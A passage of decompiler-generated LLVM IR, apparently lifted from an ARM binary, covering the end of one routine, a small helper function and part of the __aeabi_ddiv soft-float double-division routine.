  %v3_1a834 = mul i32 %v6_1a81c, 2
  %v4_1a834 = or i32 %v3_1a834, %tmp7
  %v5_1a834 = icmp slt i32 %v4_1a834, 0
  store i1 %v5_1a834, i1* @cpsr_n, align 1
  %v6_1a834 = icmp eq i32 %v4_1a834, 0
  store i1 %v6_1a834, i1* @cpsr_z, align 1
  br i1 %v6_1a834, label %bb15, label %bb16

bb15:                                             ; preds = %dec_label_pc_1a814
  %tmp23 = sext i1 %tmp22 to i32
  %v6_1a838 = add nsw i32 %tmp23, -1
  %v7_1a838 = and i32 %v5_1a82c, %v6_1a838
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_1a814, %bb15
  %v1_1a840 = phi i32 [ %v5_1a82c, %dec_label_pc_1a814 ], [ %v7_1a838, %bb15 ]
  %v2_1a83c = load i32, i32* %stack_var_16, align 4
  store i32 %v2_1a83c, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_1a840

dec_label_pc_1a844:                               ; preds = %.thread1
  %v1_1a844 = sub i32 32, %v2_1a7d0
  %v1_1a848 = load i32, i32* @r0, align 4
  %v7_1a848 = shl i32 %v1_1a848, %v1_1a844
  %v8_1a848 = or i32 %v7_1a848, %tmp7
  %v6_1a84c = lshr i32 %v1_1a848, %v2_1a7d0
  %v1_1a850 = load i32, i32* @r1, align 4
  %v7_1a850 = shl i32 %v1_1a850, %v1_1a844
  %v8_1a850 = or i32 %v7_1a850, %v6_1a84c
  %v6_1a854 = lshr i32 %v1_1a850, %v2_1a7d0
  %v1_1a858 = and i32 %v1_1a850, -2147483648
  store i32 %v1_1a858, i32* @r1, align 4
  %v7_1a85c = lshr i32 %v1_1a858, %v2_1a7d0
  %v8_1a85c = sub i32 -1, %v7_1a85c
  %v9_1a85c = and i32 %v6_1a854, %v8_1a85c
  %tmp24 = icmp slt i32 %v8_1a850, 0
  %v4_1a860 = zext i1 %tmp24 to i32
  %v5_1a860 = add i32 %v4_1a860, %v9_1a85c
  %v3_1a864 = mul i32 %v8_1a850, 2
  %v4_1a864 = or i32 %v8_1a848, %v3_1a864
  %v5_1a864 = icmp slt i32 %v4_1a864, 0
  store i1 %v5_1a864, i1* @cpsr_n, align 1
  %v6_1a864 = icmp eq i32 %v4_1a864, 0
  store i1 %v6_1a864, i1* @cpsr_z, align 1
  br i1 %v6_1a864, label %bb17, label %bb18

bb17:                                             ; preds = %dec_label_pc_1a844
  %tmp25 = sext i1 %tmp24 to i32
  %v6_1a868 = add nsw i32 %tmp25, -1
  %v7_1a868 = and i32 %v5_1a860, %v6_1a868
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_1a844, %bb17
  %v1_1a870 = phi i32 [ %v5_1a860, %dec_label_pc_1a844 ], [ %v7_1a868, %bb17 ]
  %v2_1a86c = load i32, i32* %stack_var_16, align 4
  store i32 %v2_1a86c, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_1a870

dec_label_pc_1a930:                               ; preds = %dec_label_pc_1a7b4
  %v0_1a930 = load i32, i32* @r1, align 4
  %v1_1a930 = and i32 %v0_1a930, -2147483648
  %v1_1a938 = or i32 %v1_1a930, 2146435072
  store i32 %v1_1a938, i32* @r1, align 4
  store i32 %tmp10, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v5_1a860, { 1, 0 }
  uselistorder i32 %v5_1a82c, { 1, 0, 2 }
  uselistorder i32 %v8_1a824, { 1, 0 }
  uselistorder i32 %v1_1a814, { 1, 0 }
  uselistorder i32 %v5_1a7fc, { 1, 0 }
  uselistorder i32 %v1_1a7f0, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1a7e4, { 1, 0 }
  uselistorder i32 %v2_1a7d0, { 5, 6, 7, 9, 0, 1, 2, 3, 4, 8 }
  uselistorder i32 %v1_1a7cc, { 1, 0 }
  uselistorder i32 %v4_1a7b8, { 1, 2, 0 }
  uselistorder i32 %v0_1a7b8, { 1, 0, 2 }
  uselistorder i32 %tmp10, { 1, 0 }
  uselistorder i32 %tmp6, { 2, 1, 0 }
  uselistorder i32 %tmp5, { 2, 1, 0 }
  uselistorder i32 12, { 46, 47, 64, 71, 8, 72, 75, 3, 1, 2, 76, 77, 5, 0, 4, 87, 28, 10, 32, 11, 12, 73, 74, 29, 30, 31, 70, 13, 88, 89, 9, 135, 136, 137, 138, 139, 141, 142, 140, 143, 144, 145, 146, 147, 148, 149, 14, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 15, 65, 66, 67, 68, 69, 33, 34, 16, 35, 36, 37, 63, 95, 38, 39, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 6, 78, 79, 80, 81, 82, 17, 83, 18, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 131, 124, 125, 126, 127, 128, 129, 130, 132, 133, 19, 134, 84, 7, 20, 21, 22, 24, 23, 25, 61, 85, 86, 26, 40, 41, 42, 43, 44, 45, 27, 62, 90, 91, 92, 93, 94 }
  uselistorder i32 -32, { 4, 3, 5, 6, 7, 11, 8, 12, 13, 9, 2, 10, 0, 1, 14 }
  uselistorder i32 54, { 2, 0, 1 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_1a948(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1a948:
  %v1_1a94c = or i32 %arg1, 2146959360
  store i32 %v1_1a94c, i32* @r1, align 4
  %v1_1a954 = load i32, i32* @r0, align 4
  ret i32 %v1_1a954
}

define i32 @__aeabi_ddiv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1a958 = load i32, i32* @r4, align 4
  store i32 %v3_1a958, i32* %stack_var_-16, align 4
  %v6_1a958 = load i32, i32* @r5, align 4
  %v9_1a958 = load i32, i32* @r6, align 4
  %v12_1a958 = load i32, i32* @lr, align 4
  store i32 2047, i32* %ip.global-to-local, align 4
  %v1_1a964 = load i32, i32* @r1, align 4
  %v4_1a964 = udiv i32 %v1_1a964, 1048576
  %v5_1a964 = urem i32 %v4_1a964, 2048
  store i32 %v5_1a964, i32* @r4, align 4
  %v6_1a964 = icmp eq i32 %v5_1a964, 0
  br i1 %v6_1a964, label %entry..thread2_crit_edge, label %bb

entry..thread2_crit_edge:                         ; preds = %entry
  %.pre147 = udiv i32 %arg4, 1048576
  br label %.thread2

bb:                                               ; preds = %entry
  %v5_1a968 = udiv i32 %arg4, 1048576
  %v6_1a968 = urem i32 %v5_1a968, 2048
  store i32 %v6_1a968, i32* %r5.global-to-local, align 4
  %v7_1a968 = icmp eq i32 %v6_1a968, 0
  br i1 %v7_1a968, label %.thread1, label %bb90

.thread1:                                         ; preds = %bb
  br label %dec_label_pc_1aaf4

bb90:                                             ; preds = %bb
  %v5_1a96c = icmp eq i32 %v5_1a964, 2047
  br i1 %v5_1a96c, label %.thread2, label %bb91

.thread2:                                         ; preds = %entry..thread2_crit_edge, %bb90
  %.pre145.pre-phi = phi i32 [ %.pre147, %entry..thread2_crit_edge ], [ %v5_1a968, %bb90 ]
  br label %dec_label_pc_1aaf4

bb91:                                             ; preds = %bb90
  %v5_1a970 = icmp eq i32 %v6_1a968, 2047
  br i1 %v5_1a970, label %dec_label_pc_1aaf4, label %dec_label_pc_1a978

dec_label_pc_1a978:                               ; preds = %bb91
  %v2_1a978 = sub nsw i32 %v5_1a964, %v6_1a968
  store i32 %v2_1a978, i32* %r4.global-to-local, align 4
  %v2_1a97c = xor i32 %v1_1a964, %arg4
  %v4_1a980 = mul i32 %arg4, 4096
  %v5_1a980 = or i32 %v4_1a980, %arg3
  store i32 %v5_1a980, i32* %r5.global-to-local, align 4
  %v7_1a980 = icmp eq i32 %v5_1a980, 0
  %v3_1a984 = mul i32 %v1_1a964, 4096
  store i32 %v3_1a984, i32* %r1.global-to-local, align 4
  br i1 %v7_1a980, label %dec_label_pc_1aac0, label %dec_label_pc_1a98c

dec_label_pc_1a98c:                               ; preds = %dec_label_pc_1a978
  %tmp92 = mul i32 %arg4, 256
  %v4_1a994 = and i32 %tmp92, 268435200
  %v4_1a998 = udiv i32 %arg3, 16777216
  %v5_1a994 = or i32 %v4_1a998, %v4_1a994
  %v5_1a998 = or i32 %v5_1a994, 268435456
  store i32 %v5_1a998, i32* %r3.global-to-local, align 4
  %v3_1a99c = mul i32 %arg3, 256
  store i32 %v3_1a99c, i32* %r2.global-to-local, align 4
  %tmp93 = mul i32 %v1_1a964, 256
  %v4_1a9a0 = and i32 %tmp93, 268435200
  %v1_1a9a4 = load i32, i32* @r0, align 4
  %v4_1a9a4 = udiv i32 %v1_1a9a4, 16777216
  %v5_1a9a0 = or i32 %v4_1a9a0, %v4_1a9a4
  %v5_1a9a4 = or i32 %v5_1a9a0, 268435456
  store i32 %v5_1a9a4, i32* %r5.global-to-local, align 4
  %v3_1a9a8 = mul i32 %v1_1a9a4, 256
  store i32 %v3_1a9a8, i32* %r6.global-to-local, align 4
  %v1_1a9ac = and i32 %v2_1a97c, -2147483648
  store i32 %v1_1a9ac, i32* %r1.global-to-local, align 4
  %v3_1a9b0 = icmp uge i32 %v5_1a9a4, %v5_1a998
  %v9_1a9b0 = icmp eq i32 %v5_1a9a4, %v5_1a998
  br i1 %v9_1a9b0, label %bb94, label %bb95

bb94:                                             ; preds = %dec_label_pc_1a98c
  %v4_1a9b4 = icmp uge i32 %v3_1a9a8, %v3_1a99c
  br label %bb95

bb95:                                             ; preds = %dec_label_pc_1a98c, %bb94
  %v1_1a9b8 = phi i1 [ %v3_1a9b0, %dec_label_pc_1a98c ], [ %v4_1a9b4, %bb94 ]
  %v2_1a9b8 = add nsw i32 %v2_1a978, 253
  %v3_1a9b8 = zext i1 %v1_1a9b8 to i32
  %v4_1a9b8 = add nsw i32 %v2_1a9b8, %v3_1a9b8
  %v8_1a9b8 = icmp ule i32 %v4_1a9b8, %v2_1a978
  %v9_1a9b8 = icmp ugt i32 %v2_1a978, -254
  %v10_1a9b8 = select i1 %v1_1a9b8, i1 %v8_1a9b8, i1 %v9_1a9b8
  %v1_1a9bc = add nsw i32 %v4_1a9b8, 768
  store i32 %v1_1a9bc, i32* %r4.global-to-local, align 4
  br i1 %v10_1a9b8, label %dec_label_pc_1a9cc, label %dec_label_pc_1a9c4

dec_label_pc_1a9c4:                               ; preds = %bb95
  %v3_1a9c4 = udiv i32 %v5_1a998, 2
  store i32 %v3_1a9c4, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1a9cc

dec_label_pc_1a9cc:                               ; preds = %bb95, %dec_label_pc_1a9c4
  %v0_1a9d4 = phi i32 [ %v5_1a998, %bb95 ], [ %v3_1a9c4, %dec_label_pc_1a9c4 ]
  %v0_1a9d8 = phi i32 [ %v3_1a99c, %bb95 ], [ 0, %dec_label_pc_1a9c4 ]
  %v2_1a9cc = sub i32 %v3_1a9a8, %v0_1a9d8
  store i32 %v2_1a9cc, i32* %r6.global-to-local, align 4
  %v3_1a9cc = icmp uge i32 %v3_1a9a8, %v0_1a9d8
  %v3_1a9d0 = icmp eq i1 %v3_1a9cc, false
  %v4_1a9d0 = sub nsw i32 %v5_1a9a4, %v0_1a9d4
  %v6_1a9d0 = sext i1 %v3_1a9d0 to i32
  %v7_1a9d0 = add nsw i32 %v6_1a9d0, %v4_1a9d0
  store i32 %v7_1a9d0, i32* %r5.global-to-local, align 4
  %v3_1a9d4 = udiv i32 %v0_1a9d4, 2
  store i32 %v3_1a9d4, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1a9e4.outer

dec_label_pc_1a9e4.outer:                         ; preds = %dec_label_pc_1aa7c, %dec_label_pc_1a9cc
  %v1_1aa90.ph = phi i32 [ %v2_1aa7c, %dec_label_pc_1aa7c ], [ %v1_1a9ac, %dec_label_pc_1a9cc ]
  %v0_1a9e8.ph = phi i32 [ %v5_1aa58, %dec_label_pc_1aa7c ], [ %v7_1a9d0, %dec_label_pc_1a9cc ]
  %v1_1a9ec.ph = phi i32 [ %v3_1aa5c, %dec_label_pc_1aa7c ], [ %v2_1a9cc, %dec_label_pc_1a9cc ]
  %v5_1aa6417.ph = phi i32 [ %v5_1aa64, %dec_label_pc_1aa7c ], [ %v3_1a9d4, %dec_label_pc_1a9cc ]
  %v3_1aa6813.ph = phi i32 [ %v3_1aa68, %dec_label_pc_1aa7c ], [ 0, %dec_label_pc_1a9cc ]
  %storemerge133 = phi i32 [ 0, %dec_label_pc_1aa7c ], [ 1048576, %dec_label_pc_1a9cc ]
  %storemerge = phi i32 [ -2147483648, %dec_label_pc_1aa7c ], [ 524288, %dec_label_pc_1a9cc ]
  store i32 %storemerge133, i32* %r0.global-to-local, align 4
  store i32 %storemerge, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1a9e4

dec_label_pc_1a9e4:                               ; preds = %dec_label_pc_1a9e4.outer, %dec_label_pc_1aa54
  %v1_1aa4859 = phi i32 [ %v2_1aa90, %dec_label_pc_1aa54 ], [ %storemerge133, %dec_label_pc_1a9e4.outer ]
  %v1_1a9f4 = phi i32 [ %v1_1a9f432, %dec_label_pc_1aa54 ], [ %storemerge133, %dec_label_pc_1a9e4.outer ]
  %v1_1aa1041 = phi i32 [ %v1_1aa1043, %dec_label_pc_1aa54 ], [ %storemerge133, %dec_label_pc_1a9e4.outer ]
  %v1_1aa2c50 = phi i32 [ %v1_1aa2c52, %dec_label_pc_1aa54 ], [ %storemerge133, %dec_label_pc_1a9e4.outer ]
  %v0_1aa6c = phi i32 [ %v3_1aa6c, %dec_label_pc_1aa54 ], [ %storemerge, %dec_label_pc_1a9e4.outer ]
  %v0_1a9e8 = phi i32 [ %v5_1aa58, %dec_label_pc_1aa54 ], [ %v0_1a9e8.ph, %dec_label_pc_1a9e4.outer ]
  %v1_1a9ec = phi i32 [ %v3_1aa5c, %dec_label_pc_1aa54 ], [ %v1_1a9ec.ph, %dec_label_pc_1a9e4.outer ]
  %v5_1aa6417 = phi i32 [ %v5_1aa64, %dec_label_pc_1aa54 ], [ %v5_1aa6417.ph, %dec_label_pc_1a9e4.outer ]
  %v3_1aa6813 = phi i32 [ %v3_1aa68, %dec_label_pc_1aa54 ], [ %v3_1aa6813.ph, %dec_label_pc_1a9e4.outer ]
  %v3_1a9e4 = icmp uge i32 %v1_1a9ec, %v3_1aa6813
  %v3_1a9e8 = icmp eq i1 %v3_1a9e4, false
  %v4_1a9e8 = sub i32 %v0_1a9e8, %v5_1aa6417
  %v6_1a9e8 = sext i1 %v3_1a9e8 to i32
  %v7_1a9e8 = add i32 %v6_1a9e8, %v4_1a9e8
  %v8_1a9e8 = zext i1 %v3_1a9e8 to i32
  %v9_1a9e8 = sub i32 %v7_1a9e8, %v8_1a9e8
  %v10_1a9e8 = icmp ult i32 %v0_1a9e8, %v9_1a9e8
  %v11_1a9e8 = icmp ne i32 %v5_1aa6417, -1
  %v12_1a9e8 = or i1 %v11_1a9e8, %v10_1a9e8
  %v13_1a9e8 = icmp ult i32 %v0_1a9e8, %v5_1aa6417
  %v14_1a9e8 = select i1 %v3_1a9e8, i1 %v12_1a9e8, i1 %v13_1a9e8
  br i1 %v14_1a9e8, label %.thread4, label %bb96

bb96:                                             ; preds = %dec_label_pc_1a9e4
  %v3_1a9ec = sub i32 %v1_1a9ec, %v3_1aa6813
  store i32 %v3_1a9ec, i32* %r6.global-to-local, align 4
  store i32 %v7_1a9e8, i32* %r5.global-to-local, align 4
  %v3_1a9f4 = or i32 %v1_1a9f4, %v0_1aa6c
  store i32 %v3_1a9f4, i32* %r0.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_1a9e4, %bb96
  %v1_1aa4858 = phi i32 [ %v1_1aa4859, %dec_label_pc_1a9e4 ], [ %v3_1a9f4, %bb96 ]
  %v1_1a9f435 = phi i32 [ %v1_1a9f4, %dec_label_pc_1a9e4 ], [ %v3_1a9f4, %bb96 ]
  %v1_1aa10 = phi i32 [ %v1_1aa1041, %dec_label_pc_1a9e4 ], [ %v3_1a9f4, %bb96 ]
  %v1_1aa2c49 = phi i32 [ %v1_1aa2c50, %dec_label_pc_1a9e4 ], [ %v3_1a9f4, %bb96 ]
  %v0_1aa04 = phi i32 [ %v0_1a9e8, %dec_label_pc_1a9e4 ], [ %v7_1a9e8, %bb96 ]
  %v1_1aa08 = phi i32 [ %v1_1a9ec, %dec_label_pc_1a9e4 ], [ %v3_1a9ec, %bb96 ]
  %v1_1a9f8 = urem i32 %v5_1aa6417, 2
  %v2_1a9f8 = icmp ne i32 %v1_1a9f8, 0
  %v3_1a9f8 = udiv i32 %v5_1aa6417, 2
  %v3_1a9fc = zext i1 %v2_1a9f8 to i32
  %v6_1a9fc = zext i32 %v3_1aa6813 to i64
  %v7_1a9fc = sub i32 33, %v3_1aa6813
  %v8_1a9fc = zext i32 %v7_1a9fc to i64
  %v9_1a9fc = shl i64 %v6_1a9fc, %v8_1a9fc
  %v10_1a9fc = sub i32 32, %v3_1aa6813
  %v11_1a9fc = shl i32 %v3_1a9fc, %v10_1a9fc
  %v12_1a9fc = zext i32 %v11_1a9fc to i64
  %v14_1a9fc = or i64 %v12_1a9fc, %v9_1a9fc
  %v15_1a9fc = trunc i64 %v14_1a9fc to i32
  %v3_1aa00 = icmp uge i32 %v1_1aa08, %v15_1a9fc
  %v3_1aa04 = icmp eq i1 %v3_1aa00, false
  %v4_1aa04 = sub i32 %v0_1aa04, %v3_1a9f8
  %v6_1aa04 = sext i1 %v3_1aa04 to i32
  %v7_1aa04 = add i32 %v6_1aa04, %v4_1aa04
  %v13_1aa04 = icmp ult i32 %v0_1aa04, %v3_1a9f8
  %v14_1aa04 = or i1 %v13_1aa04, %v3_1aa04
  br i1 %v14_1aa04, label %.thread6, label %bb97

bb97:                                             ; preds = %.thread4
  %v3_1aa08 = sub i32 %v1_1aa08, %v15_1a9fc
  store i32 %v3_1aa08, i32* %r6.global-to-local, align 4
  store i32 %v7_1aa04, i32* %r5.global-to-local, align 4
  %v5_1aa10 = udiv i32 %v0_1aa6c, 2
  %v6_1aa10 = or i32 %v1_1aa10, %v5_1aa10
  store i32 %v6_1aa10, i32* %r0.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %.thread4, %bb97
  %v1_1aa4857 = phi i32 [ %v1_1aa4858, %.thread4 ], [ %v6_1aa10, %bb97 ]
  %v1_1a9f434 = phi i32 [ %v1_1a9f435, %.thread4 ], [ %v6_1aa10, %bb97 ]
  %v1_1aa1045 = phi i32 [ %v1_1aa10, %.thread4 ], [ %v6_1aa10, %bb97 ]
  %v1_1aa2c = phi i32 [ %v1_1aa2c49, %.thread4 ], [ %v6_1aa10, %bb97 ]
  %v0_1aa20 = phi i32 [ %v0_1aa04, %.thread4 ], [ %v7_1aa04, %bb97 ]
  %v1_1aa24 = phi i32 [ %v1_1aa08, %.thread4 ], [ %v3_1aa08, %bb97 ]
  %v1_1aa14 = urem i32 %v3_1a9f8, 2
  %v2_1aa14 = icmp ne i32 %v1_1aa14, 0
  %v3_1aa14 = udiv i32 %v5_1aa6417, 4
  %v3_1aa18 = zext i1 %v2_1aa14 to i32
  %v6_1aa18 = and i64 %v14_1a9fc, 4294967295
  %v7_1aa18 = sub i32 33, %v15_1a9fc
  %v8_1aa18 = zext i32 %v7_1aa18 to i64
  %v9_1aa18 = shl i64 %v6_1aa18, %v8_1aa18
  %v10_1aa18 = sub i32 32, %v15_1a9fc
  %v11_1aa18 = shl i32 %v3_1aa18, %v10_1aa18
  %v12_1aa18 = zext i32 %v11_1aa18 to i64
  %v14_1aa18 = or i64 %v12_1aa18, %v9_1aa18
  %v15_1aa18 = trunc i64 %v14_1aa18 to i32
  %v3_1aa1c = icmp uge i32 %v1_1aa24, %v15_1aa18
  %v3_1aa20 = icmp eq i1 %v3_1aa1c, false
  %v4_1aa20 = sub i32 %v0_1aa20, %v3_1aa14
  %v6_1aa20 = sext i1 %v3_1aa20 to i32
  %v7_1aa20 = add i32 %v6_1aa20, %v4_1aa20
  %v13_1aa20 = icmp ult i32 %v0_1aa20, %v3_1aa14
  %v14_1aa20 = or i1 %v13_1aa20, %v3_1aa20
  br i1 %v14_1aa20, label %.thread8, label %bb98

bb98:                                             ; preds = %.thread6
  %v3_1aa24 = sub i32 %v1_1aa24, %v15_1aa18
  store i32 %v3_1aa24, i32* %r6.global-to-local, align 4
  store i32 %v7_1aa20, i32* %r5.global-to-local, align 4
  %v5_1aa2c = udiv i32 %v0_1aa6c, 4
  %v6_1aa2c = or i32 %v1_1aa2c, %v5_1aa2c
  store i32 %v6_1aa2c, i32* %r0.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %.thread6, %bb98
  %v1_1aa48 = phi i32 [ %v1_1aa4857, %.thread6 ], [ %v6_1aa2c, %bb98 ]
  %v1_1a9f433 = phi i32 [ %v1_1a9f434, %.thread6 ], [ %v6_1aa2c, %bb98 ]
  %v1_1aa1044 = phi i32 [ %v1_1aa1045, %.thread6 ], [ %v6_1aa2c, %bb98 ]
  %v1_1aa2c53 = phi i32 [ %v1_1aa2c, %.thread6 ], [ %v6_1aa2c, %bb98 ]
  %v0_1aa3c = phi i32 [ %v0_1aa20, %.thread6 ], [ %v7_1aa20, %bb98 ]
  %v1_1aa40 = phi i32 [ %v1_1aa24, %.thread6 ], [ %v3_1aa24, %bb98 ]
  %v1_1aa30 = urem i32 %v3_1aa14, 2
  %v2_1aa30 = icmp ne i32 %v1_1aa30, 0
  %v3_1aa30 = udiv i32 %v5_1aa6417, 8
  %v3_1aa34 = zext i1 %v2_1aa30 to i32
  %v6_1aa34 = and i64 %v14_1aa18, 4294967295
  %v7_1aa34 = sub i32 33, %v15_1aa18
  %v8_1aa34 = zext i32 %v7_1aa34 to i64
  %v9_1aa34 = shl i64 %v6_1aa34, %v8_1aa34
  %v10_1aa34 = sub i32 32, %v15_1aa18
  %v11_1aa34 = shl i32 %v3_1aa34, %v10_1aa34
  %v12_1aa34 = zext i32 %v11_1aa34 to i64
  %v14_1aa34 = or i64 %v12_1aa34, %v9_1aa34
  %v15_1aa34 = trunc i64 %v14_1aa34 to i32
  %v3_1aa38 = icmp uge i32 %v1_1aa40, %v15_1aa34
  %v3_1aa3c = icmp eq i1 %v3_1aa38, false
  %v4_1aa3c = sub i32 %v0_1aa3c, %v3_1aa30
  %v6_1aa3c = sext i1 %v3_1aa3c to i32
  %v7_1aa3c = add i32 %v6_1aa3c, %v4_1aa3c
  %v13_1aa3c = icmp ult i32 %v0_1aa3c, %v3_1aa30
  %v14_1aa3c = or i1 %v13_1aa3c, %v3_1aa3c
  br i1 %v14_1aa3c, label %.thread10, label %bb100

bb100:                                            ; preds = %.thread8
  %v3_1aa40 = sub i32 %v1_1aa40, %v15_1aa34
  store i32 %v3_1aa40, i32* %r6.global-to-local, align 4
  store i32 %v7_1aa3c, i32* %r5.global-to-local, align 4
  %v5_1aa48 = udiv i32 %v0_1aa6c, 8
  %v6_1aa48 = or i32 %v1_1aa48, %v5_1aa48
  store i32 %v6_1aa48, i32* %r0.global-to-local, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread8, %bb100
  %v1_1aa58 = phi i32 [ %v1_1aa40, %.thread8 ], [ %v3_1aa40, %bb100 ]
  %v0_1aa54 = phi i32 [ %v0_1aa3c, %.thread8 ], [ %v7_1aa3c, %bb100 ]
  %v2_1aa90 = phi i32 [ %v1_1aa48, %.thread8 ], [ %v6_1aa48, %bb100 ]
  %v1_1a9f432 = phi i32 [ %v1_1a9f433, %.thread8 ], [ %v6_1aa48, %bb100 ]
  %v1_1aa1043 = phi i32 [ %v1_1aa1044, %.thread8 ], [ %v6_1aa48, %bb100 ]
  %v1_1aa2c52 = phi i32 [ %v1_1aa2c53, %.thread8 ], [ %v6_1aa48, %bb100 ]
  %v2_1aa4c = or i32 %v0_1aa54, %v1_1aa58
  %v4_1aa4c = icmp eq i32 %v2_1aa4c, 0
  br i1 %v4_1aa4c, label %dec_label_pc_1aa8c, label %dec_label_pc_1aa54

dec_label_pc_1aa54:                               ; preds = %.thread10
  %v3_1aa54 = mul i32 %v0_1aa54, 16
  %v4_1aa58 = udiv i32 %v1_1aa58, 268435456
  %v5_1aa58 = or i32 %v3_1aa54, %v4_1aa58
  store i32 %v5_1aa58, i32* %r5.global-to-local, align 4
  %v3_1aa5c = mul i32 %v1_1aa58, 16
  store i32 %v3_1aa5c, i32* %r6.global-to-local, align 4
  %v3_1aa60 = mul nuw i32 %v3_1aa30, 8
  %v4_1aa64 = udiv i32 %v15_1aa34, 536870912
  %v5_1aa64 = or i32 %v4_1aa64, %v3_1aa60
  %v3_1aa68 = mul i32 %v15_1aa34, 8
  %v3_1aa6c = udiv i32 %v0_1aa6c, 16
  store i32 %v3_1aa6c, i32* %ip.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1aa6c, 16
  br i1 %tmp, label %dec_label_pc_1aa74, label %dec_label_pc_1a9e4

dec_label_pc_1aa74:                               ; preds = %dec_label_pc_1aa54
  %v1_1aa74 = and i32 %v1_1aa90.ph, 1048576
  %v2_1aa74 = icmp eq i32 %v1_1aa74, 0
  br i1 %v2_1aa74, label %dec_label_pc_1aa7c, label %.thread11.loopexit

dec_label_pc_1aa7c:                               ; preds = %dec_label_pc_1aa74
  %v2_1aa7c = or i32 %v2_1aa90, %v1_1aa90.ph
  store i32 %v2_1aa7c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1a9e4.outer

dec_label_pc_1aa8c:                               ; preds = %.thread10
  store i32 %v15_1aa34, i32* %r2.global-to-local, align 4
  store i32 %v3_1aa30, i32* %r3.global-to-local, align 4
  %v1_1aa8c = and i32 %v1_1aa90.ph, 1048576
  %v2_1aa8c = icmp eq i32 %v1_1aa8c, 0
  br i1 %v2_1aa8c, label %bb101, label %.thread11

bb101:                                            ; preds = %dec_label_pc_1aa8c
  %v3_1aa90 = or i32 %v2_1aa90, %v1_1aa90.ph
  store i32 %v3_1aa90, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread11

.thread11.loopexit:                               ; preds = %dec_label_pc_1aa74
  store i32 %v3_1aa68, i32* %r2.global-to-local, align 4
  store i32 %v5_1aa64, i32* %r3.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %.thread11.loopexit, %dec_label_pc_1aa8c, %bb101
  %v1_1aa98 = add nsw i32 %v4_1a9b8, 515
  store i32 %v1_1aa98, i32* %ip.global-to-local, align 4
  %v2_1aa98 = icmp ugt i32 %v1_1a9bc, 252
  %v7_1aa98 = icmp eq i32 %v1_1a9bc, 253
  %v2_1aa9c = xor i1 %v7_1aa98, true
  %v3_1aa9c = and i1 %v2_1aa98, %v2_1aa9c
  br i1 %v3_1aa9c, label %bb102, label %bb103

bb102:                                            ; preds = %.thread11
  %v6_1aa9c = icmp ugt i32 %v1_1aa98, 1791
  %v11_1aa9c = icmp eq i32 %v1_1aa98, 1792
  br label %bb103

bb103:                                            ; preds = %.thread11, %bb102
  %v1_1aaa0 = phi i1 [ %v7_1aa98, %.thread11 ], [ %v11_1aa9c, %bb102 ]
  %v0_1aaa0 = phi i1 [ %v2_1aa98, %.thread11 ], [ %v6_1aa9c, %bb102 ]
  %v2_1aaa0 = xor i1 %v1_1aaa0, true
  %v3_1aaa0 = and i1 %v0_1aaa0, %v2_1aaa0
  call void @__pseudo_cond_branch(i1 %v3_1aaa0, i32 ptrtoint (i32* @global_var_1a7b4.981 to i32))
  %v0_1aaa4 = load i32, i32* %r5.global-to-local, align 4
  %v1_1aaa4 = load i32, i32* %r3.global-to-local, align 4
  %v2_1aaa4 = sub i32 %v0_1aaa4, %v1_1aaa4
  store i32 %v2_1aaa4, i32* %ip.global-to-local, align 4
  %v3_1aaa4 = icmp uge i32 %v0_1aaa4, %v1_1aaa4
  %v9_1aaa4 = icmp eq i32 %v0_1aaa4, %v1_1aaa4
  br i1 %v9_1aaa4, label %bb104, label %.thread12

bb104:                                            ; preds = %bb103
  %v1_1aaa8 = load i32, i32* %r6.global-to-local, align 4
  %v2_1aaa8 = load i32, i32* %r2.global-to-local, align 4
  %v3_1aaa8 = sub i32 %v1_1aaa8, %v2_1aaa8
  store i32 %v3_1aaa8, i32* %ip.global-to-local, align 4
  %v4_1aaa8 = icmp uge i32 %v1_1aaa8, %v2_1aaa8
  %v10_1aaa8 = icmp eq i32 %v1_1aaa8, %v2_1aaa8
  br i1 %v10_1aaa8, label %bb105, label %.thread12

bb105:                                            ; preds = %bb104
  %v1_1aaac = load i32, i32* %r0.global-to-local, align 4
  %v2_1aaac = urem i32 %v1_1aaac, 2
  %v3_1aaac = icmp ne i32 %v2_1aaac, 0
  %v4_1aaac = udiv i32 %v1_1aaac, 2
  store i32 %v4_1aaac, i32* %ip.global-to-local, align 4
  br label %.thread12

